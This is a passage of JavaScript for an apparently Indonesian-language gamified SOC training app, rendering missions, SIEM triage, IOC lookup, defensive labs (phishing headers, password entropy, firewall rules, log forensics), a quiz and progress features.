      dailyBox.innerHTML = `<p class="briefing-box neon-green">✓ Daily SOC Challenge hari ini telah diselesaikan! Kembali besok untuk mempertahankan streak.</p>`;
    } else {
      dailyBox.innerHTML = `
        <p class="briefing-box">Selesaikan 1 investigasi insiden atau triase log SIEM hari ini untuk mempertahankan streak operatif.</p>
        <button type="button" id="btn-start-daily" class="btn btn-primary btn-sm">Jalankan Tantangan Harian</button>
      `;
      document.getElementById('btn-start-daily')?.addEventListener('click', () => {
        const nextMission = BUILTIN_MISSIONS.find((m) => !state.completedMissions.includes(m.id)) || BUILTIN_MISSIONS[0];
        openMissionModal(nextMission, true);
      });
    }
  }

  const feedList = document.getElementById('recent-activity-list');
  if (feedList) {
    feedList.innerHTML = state.activityLog.map((item) => `
      <div class="soc-alert-item">
        <span>${escapeHTML(item)}</span>
        <span class="tag-chip">LOG</span>
      </div>
    `).join('');
  }
}

function renderMissions() {
  const grid = document.getElementById('missions-grid');
  if (!grid) return;

  const cat = document.getElementById('mission-category-filter')?.value || 'all';
  const diff = document.getElementById('mission-diff-filter')?.value || 'all';

  const filtered = BUILTIN_MISSIONS.filter((m) => {
    const okCat = cat === 'all' || m.category === cat;
    const okDiff = diff === 'all' || m.difficulty === diff;
    return okCat && okDiff;
  });

  grid.innerHTML = filtered.map((m) => {
    const done = state.completedMissions.includes(m.id);
    return `
      <article class="card mission-card glowing-card ${done ? 'completed' : ''}">
        <div>
          <div class="card-title-row">
            <span class="badge-neon">${m.id} • ${m.category.toUpperCase()}</span>
            <span class="badge-diff">${m.difficulty}</span>
          </div>
          <h3>${escapeHTML(m.title)}</h3>
          <p class="briefing-box">${escapeHTML(m.briefing)}</p>
          <div class="mini-fw-tags">
            <span class="tag-chip">NIST: ${escapeHTML(m.frameworks.nist)}</span>
            <span class="tag-chip">MITRE: ${escapeHTML(m.frameworks.mitre)}</span>
            <span class="tag-chip">CVSS: ${escapeHTML(m.frameworks.cvss)}</span>
          </div>
        </div>
        <div>
          <div class="reward-strip" style="margin-bottom:0.6rem;">
            <span class="neon-blue">+${m.xp} XP</span>
            <span class="neon-green">+${m.sp} SP</span>
            <span>${done ? '✅ COMPLETED' : '⏳ PENDING'}</span>
          </div>
          <button type="button" class="btn ${done ? 'btn-outline' : 'btn-primary'} btn-block btn-sm" data-open-mission="${m.id}">
            ${done ? 'Tinjau Ulang Investigasi' : 'Mulai Investigasi →'}
          </button>
        </div>
      </article>
    `;
  }).join('');

  grid.querySelectorAll('[data-open-mission]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const mission = BUILTIN_MISSIONS.find((item) => item.id === btn.dataset.openMission);
      if (mission) openMissionModal(mission, false);
    });
  });
}

function openMissionModal(mission, isDaily = false) {
  const modal = document.getElementById('mission-modal');
  const badge = document.getElementById('modal-mission-badge');
  const title = document.getElementById('modal-mission-title');
  const body = document.getElementById('modal-mission-body');
  if (!modal || !body) return;

  playTone('click');
  badge.textContent = `${mission.id} • ${mission.difficulty.toUpperCase()}${isDaily ? ' • DAILY CHALLENGE' : ''}`;
  title.textContent = mission.title;

  body.innerHTML = `
    <p class="briefing-box">${escapeHTML(mission.briefing)}</p>
    <div class="fw-panel">
      <div class="fw-section-title">STANDARDS &amp; THREAT FRAMEWORK MAPPING</div>
      <div class="fw-grid">
        <div class="fw-pill"><span>NIST CSF</span><strong>${escapeHTML(mission.frameworks.nist)}</strong></div>
        <div class="fw-pill"><span>NIST SP 800-61</span><strong>${escapeHTML(mission.frameworks.sp800)}</strong></div>
        <div class="fw-pill"><span>CIS CONTROLS</span><strong>${escapeHTML(mission.frameworks.cis)}</strong></div>
        <div class="fw-pill"><span>MITRE ATT&amp;CK</span><strong>${escapeHTML(mission.frameworks.mitre)}</strong></div>
        <div class="fw-pill"><span>CWE / CVSS</span><strong>${escapeHTML(mission.frameworks.cwe)} • ${escapeHTML(mission.frameworks.cvss)}</strong></div>
      </div>
    </div>
    <div class="artifact-box">${escapeHTML(mission.artifact)}</div>
    <p style="font-weight:700; margin-top:0.65rem;">${escapeHTML(mission.question)}</p>
    <div class="options-list" id="modal-options-list">
      ${mission.options.map((opt, idx) => `
        <button type="button" class="option-btn" data-opt-idx="${idx}">${escapeHTML(opt)}</button>
      `).join('')}
    </div>
    <div id="modal-feedback" class="feedback-box hidden"></div>
  `;

  body.querySelectorAll('.option-btn').forEach((btn) => {
    btn.addEventListener('click', () => {
      const chosen = Number(btn.dataset.optIdx);
      const isCorrect = chosen === mission.answer;
      body.querySelectorAll('.option-btn').forEach((b, i) => {
        b.disabled = true;
        if (i === mission.answer) b.classList.add('correct');
        else if (i === chosen && !isCorrect) b.classList.add('wrong');
      });

      const fb = document.getElementById('modal-feedback');
      fb.classList.remove('hidden');

      if (isCorrect) {
        playTone('success');
        const firstClear = !state.completedMissions.includes(mission.id);
        if (firstClear) state.completedMissions.push(mission.id);

        const today = new Date().toISOString().slice(0, 10);
        let bonusXp = 0;
        if (isDaily && state.dailyCompletedDate !== today) {
          state.dailyCompletedDate = today;
          bonusXp = 150;
        }

        const earnedXp = (firstClear ? mission.xp : 25) + bonusXp;
        const earnedSp = firstClear ? mission.sp : 0;
        fb.innerHTML = `<strong class="neon-green">✓ Respons Tepat (+${earnedXp} XP${earnedSp ? `, +${earnedSp} SP` : ''})</strong><p style="margin-top:0.4rem;">${escapeHTML(mission.explanation)}</p>`;
        grantXP(earnedXp, earnedSp, `Misi ${mission.id} selesai`);
      } else {
        playTone('alert');
        fb.innerHTML = `<strong class="neon-red">✕ Kurang Tepat — Tinjau Dampak Insiden</strong><p style="margin-top:0.4rem;">${escapeHTML(mission.explanation)}</p>`;
      }
    });
  });

  modal.classList.remove('hidden');
}

function renderSIEM() {
  const feed = document.getElementById('siem-feed');
  if (!feed) return;

  const sourceFilter = document.getElementById('siem-source-filter')?.value || 'all';
  const list = siemEvents.filter((e) => sourceFilter === 'all' || e.source === sourceFilter);

  const fpr = state.siemHandled === 0 ? 6 : Math.round((state.siemFalsePositives / state.siemHandled) * 100);
  const containment = state.siemHandled === 0 ? 94 : Math.max(50, 100 - fpr);

  const fprEl = document.getElementById('siem-fpr');
  const contEl = document.getElementById('siem-containment');
  if (fprEl) fprEl.textContent = `${fpr}%`;
  if (contEl) contEl.textContent = `${containment}%`;

  if (list.length === 0) {
    feed.innerHTML = `<div class="card"><p class="mono-text">Tidak ada alert pada filter ini. Klik "+ Ingest Event Baru" untuk simulasi log masuk.</p></div>`;
    return;
  }

  feed.innerHTML = list.map((ev) => `
    <div class="soc-alert-item ${ev.severity}">
      <div>
        <div class="mono-text" style="font-size:0.72rem;">[${ev.time}] SENSOR: <strong>${ev.source}</strong> • ID: ${ev.id}</div>
        <div style="font-weight:600; margin-top:0.2rem;">${escapeHTML(ev.title)}</div>
      </div>
      <div style="display:flex; gap:0.4rem; flex-wrap:wrap;">
        <button type="button" class="btn btn-sm btn-danger" data-siem-action="contain" data-siem-id="${ev.id}">Contain</button>
        <button type="button" class="btn btn-sm btn-outline" data-siem-action="dismiss" data-siem-id="${ev.id}">Benign</button>
      </div>
    </div>
  `).join('');

  feed.querySelectorAll('[data-siem-action]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const id = btn.dataset.siemId;
      const action = btn.dataset.siemAction;
      const idx = siemEvents.findIndex((item) => item.id === id);
      if (idx === -1) return;

      const ev = siemEvents[idx];
      siemEvents.splice(idx, 1);
      state.siemHandled += 1;

      const isAccurate = (action === 'contain' && ev.malicious) || (action === 'dismiss' && !ev.malicious);
      if (isAccurate) {
        playTone('success');
        showToast(`✓ Triase SIEM tepat untuk ${ev.id} (+45 XP)`, 'success');
        grantXP(45, 0, `Triase SIEM ${ev.id}`);
      } else {
        playTone('alert');
        state.siemFalsePositives += 1;
        showToast(`⚠️ Klasifikasi meleset pada ${ev.id} — False Positive dicatat`, 'alert');
        saveState();
        renderAll();
      }
    });
  });
}

function renderThreatIntel() {
  const grid = document.getElementById('threat-campaigns-grid');
  if (!grid) return;

  grid.innerHTML = THREAT_CAMPAIGNS.map((c) => `
    <div class="card glowing-card">
      <div class="card-title-row">
        <span class="badge-neon">${c.id}</span>
        <span class="threat-badge high">${c.severity}</span>
      </div>
      <h3>${escapeHTML(c.name)}</h3>
      <p class="briefing-box">${escapeHTML(c.summary)}</p>
      <div class="mono-box" style="margin:0.5rem 0;">IOC: ${escapeHTML(c.ioc)} | MITRE: ${escapeHTML(c.mitre)}</div>
      <button type="button" class="btn btn-sm btn-outline btn-block" data-lookup-ioc="${escapeHTML(c.ioc)}">Periksa IOC di Lookup ↑</button>
    </div>
  `).join('');

  grid.querySelectorAll('[data-lookup-ioc]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const input = document.getElementById('ioc-search-input');
      if (input) input.value = btn.dataset.lookupIoc;
      runIOCLookup(btn.dataset.lookupIoc);
    });
  });
}

function runIOCLookup(rawQuery) {
  const box = document.getElementById('ioc-result-box');
  if (!box) return;
  const query = (rawQuery || '').trim().toLowerCase();
  if (!query) {
    box.textContent = 'Masukkan alamat IP, domain, atau hash SHA-256 terlebih dahulu.';
    return;
  }

  playTone('click');
  const hit = THREAT_INTEL_DB[query];
  if (hit) {
    box.innerHTML = `<strong>TARGET:</strong> ${escapeHTML(query)}\n<strong>TIPE  :</strong> ${escapeHTML(hit.type)}\n<strong>STATUS:</strong> <span class="${hit.verdict.includes('MALICIOUS') ? 'neon-red' : 'neon-green'}">${escapeHTML(hit.verdict)}</span>\n<strong>AKTOR :</strong> ${escapeHTML(hit.actor)}\n<strong>MITRE :</strong> ${escapeHTML(hit.mitre)}\n<strong>AKSI  :</strong> ${escapeHTML(hit.advice)}`;
  } else {
    const looksSuspicious = query.includes('login') || query.includes('verify') || query.includes('update') || query.endsWith('.xyz') || query.endsWith('.top');
    box.innerHTML = `<strong>TARGET:</strong> ${escapeHTML(query)}\n<strong>STATUS:</strong> <span class="${looksSuspicious ? 'neon-amber' : 'neon-blue'}">${looksSuspicious ? 'SUSPICIOUS HEURISTIC (Skor Risiko: 74/100)' : 'NO ACTIVE C2 HIT (Skor Risiko: 12/100)'}</span>\n<strong>AKSI  :</strong> ${looksSuspicious ? 'Lakukan sandboxing URL dan pantau log DNS proxy organisasi.' : 'Tetap terapkan pemantauan standar SIEM.'}`;
  }
}

function renderLab() {
  const ws = document.getElementById('lab-workspace');
  if (!ws) return;

  if (currentLab === 'phishing') {
    ws.innerHTML = `
      <div class="card-title-row"><h3>Lab 1: Phishing Header &amp; Authentication Inspector</h3><span class="badge-neon">+80 XP</span></div>
      <p class="briefing-box">Analisis cuplikan header email berikut dan tentukan mengapa email ini harus diblokir.</p>
      <div class="email-sim-box">
        <div class="email-header-line"><strong>From:</strong> IT Helpdesk &lt;support@company-domain.com&gt;</div>
        <div class="email-header-line"><strong>Return-Path:</strong> &lt;bounce@mail-ru-relay99.xyz&gt;</div>
        <div class="email-header-line"><strong>Authentication-Results:</strong> spf=softfail; dkim=fail (signature altered); dmarc=fail</div>
        <div>Mohon verifikasi ulang kata sandi SSO Anda melalui tautan berikut dalam 30 menit.</div>
      </div>
      <div class="options-list">
        <button type="button" class="option-btn" data-lab-ans="wrong">Karena email dikirim pada jam kerja normal.</button>
        <button type="button" class="option-btn" data-lab-ans="ok">Ketidakcocokan Return-Path eksternal serta kegagalan validasi DKIM dan DMARC.</button>
      </div>
    `;
  } else if (currentLab === 'password') {
    ws.innerHTML = `
      <div class="card-title-row"><h3>Lab 2: Password Strength &amp; Bit-Entropy Analyzer</h3><span class="badge-neon">+80 XP</span></div>
      <p class="briefing-box">Uji pembuatan passphrase minimal 14 karakter dengan entropi ≥ 75 bits (standar NIST SP 800-63B).</p>
      <input type="text" id="lab-pwd-input" placeholder="Ketik simulasi passphrase kuat di sini..." autocomplete="off" />
      <div class="pwd-meter-bar"><div id="lab-pwd-bar" class="pwd-meter-fill" style="background:var(--neon-red);"></div></div>
      <p id="lab-pwd-stats" class="mono-text">Entropi: 0 bits • Status: Lemah</p>
    `;
    const pwdInput = document.getElementById('lab-pwd-input');
    pwdInput?.addEventListener('input', () => {
      const val = pwdInput.value;
      let charset = 0;
      if (/[a-z]/.test(val)) charset += 26;
      if (/[A-Z]/.test(val)) charset += 26;
      if (/[0-9]/.test(val)) charset += 10;
      if (/[^a-zA-Z0-9]/.test(val)) charset += 32;
      const entropy = charset ? Math.round(val.length * Math.log2(charset)) : 0;
      const bar = document.getElementById('lab-pwd-bar');
      const stats = document.getElementById('lab-pwd-stats');
      const pct = Math.min(100, Math.round((entropy / 90) * 100));
      if (bar) {
        bar.style.width = `${Math.max(8, pct)}%`;
        bar.style.background = entropy >= 75 ? 'var(--neon-green)' : entropy >= 50 ? 'var(--neon-amber)' : 'var(--neon-red)';
      }
      if (stats) stats.textContent = `Entropi: ${entropy} bits • Panjang: ${val.length} karakter`;
      if (entropy >= 75 && !state.completedLabs.includes('password')) {
        completeLab('password', 'Password & Entropy Lab');
      }
    });
    return;
  } else if (currentLab === 'firewall') {
    ws.innerHTML = `
      <div class="card-title-row"><h3>Lab 3: Perimeter Firewall ACL Rule Ordering</h3><span class="badge-neon">+80 XP</span></div>
      <p class="briefing-box">Server database internal (10.0.50.10:5432) tidak boleh dapat diakses langsung dari internet publik (0.0.0.0/0). Aturan mana yang benar?</p>
      <div class="options-list">
        <button type="button" class="option-btn" data-lab-ans="ok">ALLOW TCP 5432 dari App-Subnet (10.0.20.0/24) → DENY ALL TCP 5432 dari 0.0.0.0/0</button>
        <button type="button" class="option-btn" data-lab-ans="wrong">ALLOW TCP 5432 dari 0.0.0.0/0 → DENY TCP 5432 dari 10.0.20.0/24</button>
      </div>
    `;
  } else if (currentLab === 'network') {
    const nodes = [
      { key: 'fw', label: 'Perimeter Firewall', flaw: 'Telnet Port 23 terbuka', fix: 'Telnet dimatikan, hanya HTTPS/SSH' },
      { key: 'vpn', label: 'Remote VPN Gateway', flaw: 'Single-Factor Auth aktif', fix: 'MFA & Sertifikat perangkat aktif' },
      { key: 'db', label: 'Core Database VLAN', flaw: 'Terhubung ke Guest Wi-Fi', fix: 'Segmentasi mikro VLAN terisolasi' },
      { key: 'ad', label: 'Domain Controller', flaw: 'SMBv1 Legacy aktif', fix: 'SMBv1 dinonaktifkan, SMB Signing aktif' }
    ];
    ws.innerHTML = `
      <div class="card-title-row"><h3>Lab 4: Zero Trust Network Node Hardening</h3><span class="badge-neon">+80 XP</span></div>
      <p class="briefing-box">Klik keempat node infrastruktur di bawah untuk menerapkan konfigurasi hardening hingga seluruh jaringan berstatus SECURED.</p>
      <div class="net-nodes-grid">
        ${nodes.map((n) => `
          <div class="net-node-card ${hardenedNodes[n.key] ? 'secured' : ''}">
            <strong>${n.label}</strong>
            <p class="mono-text" style="margin:0.4rem 0;">${hardenedNodes[n.key] ? '✅ ' + n.fix : '⚠️ ' + n.flaw}</p>
            <button type="button" class="btn btn-sm ${hardenedNodes[n.key] ? 'btn-success' : 'btn-primary'}" data-harden-node="${n.key}">
              ${hardenedNodes[n.key] ? 'Hardened' : 'Terapkan Hardening'}
            </button>
          </div>
        `).join('')}
      </div>
    `;
    ws.querySelectorAll('[data-harden-node]').forEach((btn) => {
      btn.addEventListener('click', () => {
        hardenedNodes[btn.dataset.hardenNode] = true;
        playTone('click');
        renderLab();
        if (Object.values(hardenedNodes).every(Boolean) && !state.completedLabs.includes('network')) {
          completeLab('network', 'Network Hardening Lab');
        }
      });
    });
    return;
  } else {
    ws.innerHTML = `
      <div class="card-title-row"><h3>Lab 5: Linux Auth &amp; Lateral Movement Forensics</h3><span class="badge-neon">+80 XP</span></div>
      <div class="artifact-box">03:11:02 web-01 sshd: Accepted publickey for www-data from 10.0.12.8\n03:11:45 web-01 sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash\n03:12:19 web-01 ssh: connect to host 10.0.50.10 port 22</div>
      <p class="briefing-box">Berdasarkan kronologi log di atas, apa yang terjadi pada pukul 03:11:45?</p>
      <div class="options-list">
        <button type="button" class="option-btn" data-lab-ans="ok">Eskalasi hak akses (Privilege Escalation) dari akun web ke root diikuti lateral movement ke 10.0.50.10.</button>
        <button type="button" class="option-btn" data-lab-ans="wrong">Pembaruan paket rutin apt-get upgrade.</button>
      </div>
    `;
  }

  ws.querySelectorAll('[data-lab-ans]').forEach((btn) => {
    btn.addEventListener('click', () => {
      if (btn.dataset.labAns === 'ok') {
        btn.classList.add('correct');
        completeLab(currentLab, `Cyber Lab (${currentLab.toUpperCase()})`);
      } else {
        btn.classList.add('wrong');
        playTone('alert');
        showToast('Jawaban kurang tepat, periksa kembali indikator teknis di atas.', 'alert');
      }
    });
  });
}

function completeLab(labId, label) {
  playTone('success');
  const first = !state.completedLabs.includes(labId);
  if (first) state.completedLabs.push(labId);
  const xp = first ? 80 : 15;
  showToast(`✓ ${label} selesai! (+${xp} XP)`, 'success');
  grantXP(xp, 0, `${label} selesai`);
}

function renderQuiz() {
  const stage = document.getElementById('quiz-stage');
  if (!stage) return;

  const topic = document.getElementById('quiz-topic-filter')?.value || 'all';
  const pool = QUIZ_QUESTIONS.filter((item) => topic === 'all' || item.topic === topic);
  const item = pool[currentQuizIndex % pool.length];

  stage.innerHTML = `
    <div class="card-title-row">
      <span class="badge-neon">TOPIK: ${item.topic.toUpperCase()}</span>
      <span class="mono-text">TERJAWAB: ${state.quizAnswered} • BENAR: ${state.quizCorrect}</span>
    </div>
    <h3 style="margin-bottom:0.75rem;">${escapeHTML(item.q)}</h3>
    <div class="options-list">
      ${item.options.map((opt, idx) => `
        <button type="button" class="option-btn" data-q-idx="${idx}">${escapeHTML(opt)}</button>
      `).join('')}
    </div>
    <div id="quiz-feedback" class="feedback-box hidden"></div>
  `;

  stage.querySelectorAll('.option-btn').forEach((btn) => {
    btn.addEventListener('click', () => {
      const chosen = Number(btn.dataset.qIdx);
      const ok = chosen === item.answer;
      stage.querySelectorAll('.option-btn').forEach((b, i) => {
        b.disabled = true;
        if (i === item.answer) b.classList.add('correct');
        else if (i === chosen && !ok) b.classList.add('wrong');
      });

      state.quizAnswered += 1;
      const fb = document.getElementById('quiz-feedback');
      fb.classList.remove('hidden');

      if (ok) {
        state.quizCorrect += 1;
        playTone('success');
        fb.innerHTML = `<strong class="neon-green">✓ Benar (+40 XP)</strong><p style="margin-top:0.35rem;">${escapeHTML(item.explanation)}</p>`;
        grantXP(40, 0, 'Evaluasi Quiz Bank benar');
      } else {
        playTone('alert');
        fb.innerHTML = `<strong class="neon-red">✕ Kurang Tepat</strong><p style="margin-top:0.35rem;">${escapeHTML(item.explanation)}</p>`;
        saveState();
        renderAll();
      }
    });
  });
}

function renderSkills() {
  const spDisplay = document.getElementById('skills-sp-display');
  if (spDisplay) spDisplay.textContent = `${state.sp} SP`;

  const grid = document.getElementById('skilltree-grid');
  if (grid) {
    grid.innerHTML = SKILL_NODES.map((sk) => {
      const lvl = state.unlockedSkills[sk.id] || 0;
      const pips = Array.from({ length: sk.max }, (_, i) => `<span class="pip ${i < lvl ? 'filled' : ''}"></span>`).join('');
      return `
        <div class="card glowing-card">
          <div class="card-title-row">
            <strong>${escapeHTML(sk.name)}</strong>
            <span class="mono-text">${lvl} / ${sk.max}</span>
          </div>
          <div class="skill-pips" style="margin-bottom:0.6rem;">${pips}</div>
          <p class="briefing-box">${escapeHTML(sk.desc)}</p>
          <button type="button" class="btn btn-sm btn-primary btn-block" data-upgrade-skill="${sk.id}" ${state.sp <= 0 || lvl >= sk.max ? 'disabled' : ''}>
            ${lvl >= sk.max ? 'MAXED' : 'Upgrade (1 SP)'}
          </button>
        </div>
      `;
    }).join('');

    grid.querySelectorAll('[data-upgrade-skill]').forEach((btn) => {
      btn.addEventListener('click', () => {
        const id = btn.dataset.upgradeSkill;
        const curr = state.unlockedSkills[id] || 0;
        if (state.sp > 0 && curr < 5) {
          state.sp -= 1;
          state.unlockedSkills[id] = curr + 1;
          playTone('success');
          logActivity(`Upgrade skill ${id} ke rank ${curr + 1}`);
          saveState();
          renderAll();
        }
      });
    });
  }

  const invGrid = document.getElementById('inventory-grid');
  if (invGrid) {
    const tools = [
      { name: 'SIEM Correlation Rulebook', unlocked: true },
      { name: 'Email Header Analyzer', unlocked: state.completedMissions.length >= 1 },
      { name: 'EDR Host Isolation Token', unlocked: state.level >= 2 },
      { name: 'MITRE ATT&CK Navigator Matrix', unlocked: state.level >= 3 }
    ];
    invGrid.innerHTML = tools.map((t) => `
      <div class="career-node ${t.unlocked ? 'unlocked' : ''}">
        <strong>${escapeHTML(t.name)}</strong>
        <div class="mono-text" style="margin-top:0.25rem;">${t.unlocked ? 'ACTIVE' : 'LOCKED'}</div>
      </div>
    `).join('');
  }
}

function renderCareer() {
  const certGrid = document.getElementById('cert-grid');
  if (certGrid) {
    certGrid.innerHTML = CERTIFICATIONS.map((c) => {
      const earned = state.level >= c.reqLevel && state.completedMissions.length >= c.reqMissions;
      return `
        <div class="cert-node ${earned ? 'earned' : ''}">
          <div class="mono-text" style="font-size:0.7rem;">${escapeHTML(c.issuer)}</div>
          <strong style="display:block; margin:0.25rem 0;">${escapeHTML(c.title)}</strong>
          <div class="mono-text" style="font-size:0.72rem;">
            ${earned ? '✅ UNLOCKED' : `Syarat: LVL ${c.reqLevel} & ${c.reqMissions} Misi`}
          </div>
        </div>
      `;
    }).join('');
  }

  const roadmapList = document.getElementById('career-roadmap-list');
  if (roadmapList) {
    roadmapList.innerHTML = CAREER_STAGES.map((st) => `
      <div class="card">
        <div class="card-title-row">
          <strong>${st.title}</strong>
          <span class="lvl-tag">LVL ${st.minLevel}+</span>
        </div>
        <p class="briefing-box">${escapeHTML(st.focus)}</p>
      </div>
    `).join('');
  }
}

function renderAchievements() {
  const grid = document.getElementById('achievements-grid');
  if (grid) {
    grid.innerHTML = ACHIEVEMENTS_LIST.map((a) => {
      const unlocked = a.check(state);
      return `
        <div class="career-node ${unlocked ? 'unlocked' : ''}">
          <div class="mono-text">${unlocked ? '🏆 UNLOCKED' : '🔒 LOCKED'}</div>
          <strong style="display:block; margin:0.25rem 0;">${escapeHTML(a.title)}</strong>
          <span style="font-size:0.78rem; color:var(--text-muted);">${escapeHTML(a.desc)}</span>
        </div>
      `;
    }).join('');
  }

  const lbBody = document.getElementById('leaderboard-body');
  if (lbBody) {
    const rows = [
      { name: state.operativeName || 'OPERATIVE', rank: getCurrentRank().title, level: state.level, score: state.socScore, me: true },
      { name: 'KAI_SENTINEL', rank: 'INCIDENT RESPONDER', level: 9, score: 2150, me: false },
      { name: 'NEXUS_BLUE', rank: 'SOC ANALYST TIER 2', level: 6, score: 1380, me: false },
      { name: 'ZERO_TRUST_ID', rank: 'SOC ANALYST TIER 1', level: 4, score: 790, me: false }
    ].sort((a, b) => b.score - a.score);

    lbBody.innerHTML = rows.map((r, i) => `
      <tr style="${r.me ? 'background:rgba(0,240,255,0.08); font-weight:700;' : ''}">
        <td>#${i + 1}</td>
        <td>${escapeHTML(r.name)} ${r.me ? '(YOU)' : ''}</td>
        <td>${escapeHTML(r.rank)}</td>
        <td>LVL ${r.level}</td>
        <td class="neon-green">${r.score}</td>
      </tr>
    `).join('');
  }
}

function renderAll() {
  renderHUD();
  renderDashboard();
  renderMissions();
  renderSIEM();
  renderThreatIntel();
  renderLab();
  renderQuiz();
  renderSkills();
  renderCareer();
  renderAchievements();
}

function bindEvents() {
  // Navigation Tabs
  document.querySelectorAll('.nav-item[data-view]').forEach((btn) => {
    btn.addEventListener('click', () => {
      playTone('click');
      const view = btn.dataset.view;
      document.querySelectorAll('.nav-item').forEach((b) => b.classList.remove('active'));
      btn.classList.add('active');
      document.querySelectorAll('.view-section').forEach((sec) => sec.classList.remove('active'));
      document.getElementById(`view-${view}`)?.classList.add('active');
    });
  });

  // Onboarding Form
  document.getElementById('onboarding-form')?.addEventListener('submit', (e) => {
    e.preventDefault();
    const input = document.getElementById('operative-name-input');
    const track = document.getElementById('operative-track-select');
    const cleanName = (input?.value || 'OPERATIVE').trim().toUpperCase();
    state.operativeName = cleanName || 'OPERATIVE';
    state.track = track?.value || 'soc';
    logActivity(`Operatif ${state.operativeName} terdaftar pada jalur ${state.track.toUpperCase()}.`);
    saveState();
    document.getElementById('onboarding-modal')?.classList.add('hidden');
    playTone('success');
    renderAll();
  });

  // Close Mission Modal
  const closeModal = () => document.getElementById('mission-modal')?.classList.add('hidden');
  document.getElementById('close-mission-modal')?.addEventListener('click', closeModal);
  document.getElementById('mission-modal')?.addEventListener('click', (e) => {
    if (e.target.id === 'mission-modal') closeModal();
  });

  // Audio Toggle
  document.getElementById('btn-toggle-audio')?.addEventListener('click', () => {
    state.audioEnabled = !state.audioEnabled;
    saveState();
    renderHUD();
  });

  // Filters & Buttons
  document.getElementById('mission-category-filter')?.addEventListener('change', renderMissions);
  document.getElementById('mission-diff-filter')?.addEventListener('change', renderMissions);
  document.getElementById('siem-source-filter')?.addEventListener('change', renderSIEM);

  document.getElementById('btn-simulate-logs')?.addEventListener('click', () => {
    playTone('click');
    const sample = EXTRA_SIEM_POOL[Math.floor(Math.random() * EXTRA_SIEM_POOL.length)];
    const now = new Date().toLocaleTimeString('id-ID', { hour12: false });
    siemEvents.unshift({
      id: `EVT-${Math.floor(200 + Math.random() * 799)}`,
      time: now,
      ...sample
    });
    renderSIEM();
    showToast('📡 Event telemetri baru masuk ke konsol SIEM.', 'success');
  });

  document.getElementById('btn-analyze-ioc')?.addEventListener('click', () => {
    const val = document.getElementById('ioc-search-input')?.value || '';
    runIOCLookup(val);
  });

  document.querySelectorAll('.lab-tab[data-lab]').forEach((tab) => {
    tab.addEventListener('click', () => {
      playTone('click');
      document.querySelectorAll('.lab-tab').forEach((t) => t.classList.remove('active'));
      tab.classList.add('active');
      currentLab = tab.dataset.lab;
      renderLab();
    });
  });

  document.getElementById('quiz-topic-filter')?.addEventListener('change', () => {
    currentQuizIndex = 0;
    renderQuiz();
  });

  document.getElementById('btn-next-quiz')?.addEventListener('click', () => {
    playTone('click');
    currentQuizIndex += 1;
    renderQuiz();
  });

  // Save Export / Import / Reset
  document.getElementById('btn-export-save')?.addEventListener('click', () => {
    const blob = new Blob([JSON.stringify(state, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cda-save-${(state.operativeName || 'operative').toLowerCase()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    showToast('💾 File backup JSON berhasil diunduh.', 'success');
  });

  document.getElementById('import-save-file')?.addEventListener('change', (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const imported = JSON.parse(String(reader.result));
        state = { ...createDefaultState(), ...imported };
        saveState();
        renderAll();
        showToast('✅ Progres berhasil dipulihkan dari file JSON.', 'success');
      } catch {
        showToast('❌ Format file JSON tidak valid.', 'alert');
      }
    };
    reader.readAsText(file);
  });

  document.getElementById('btn-reset-save')?.addEventListener('click', () => {
    if (!confirm('Reset seluruh progres level, misi, dan skill point?')) return;
    state = createDefaultState();
    saveState();
    renderAll();
    document.getElementById('onboarding-modal')?.classList.remove('hidden');
  });
}

function initParticles() {
  const canvas = document.getElementById('bg-particles');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const dots = Array.from({ length: 28 }, () => ({
    x: Math.random() * window.innerWidth,
    y: Math.random() * window.innerHeight,
    vy: 0.25 + Math.random() * 0.45
  }));

  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  window.addEventListener('resize', resize);
  resize();

  function frame() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = 'rgba(0, 240, 255, 0.22)';
    for (const d of dots) {
      d.y -= d.vy;
      if (d.y < 0) d.y = canvas.height;
      ctx.beginPath();
      ctx.arc(d.x, d.y, 1.4, 0, Math.PI * 2);
      ctx.fill();
    }
    requestAnimationFrame(frame);
  }
  frame();
}

async function boot() {
  const bar = document.getElementById('loader-bar');
  const text = document.getElementById('loader-text');
  const screen = document.getElementById('loading-screen');

  try {
    if (bar) bar.style.width = '45%';
    if (text) text.textContent = 'Memuat modul SOC Telemetry, SIEM & Threat Intel...';

    // Safe non-blocking preload of sibling modules if present
    await Promise.allSettled([
      import('./state.js'),
      import('./missions.js'),
      import('./siem.js'),
      import('./threatintel.js'),
      import('./labs.js'),
      import('./quiz.js'),
      import('./skills.js'),
      import('./career.js'),
      import('./achievements.js'),
      import('./ui.js'),
      import('./audio.js')
    ]);

    if (bar) bar.style.width = '85%';
    if (text) text.textContent = 'Menyiapkan antarmuka CDA // SEC-OS v4.3...';

    initParticles();
    bindEvents();
    renderAll();

    if (bar) bar.style.width = '100%';
  } catch (err) {
    console.error('Boot recovery:', err);
  } finally {
    window.__CDA_BOOT_DONE = true;
    setTimeout(() => {
      if (screen) screen.classList.add('hidden');
      if (!state.operativeName) {
        document.getElementById('onboarding-modal')?.classList.remove('hidden');
      }
    }, 220);
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', boot);
} else {
  boot();
}
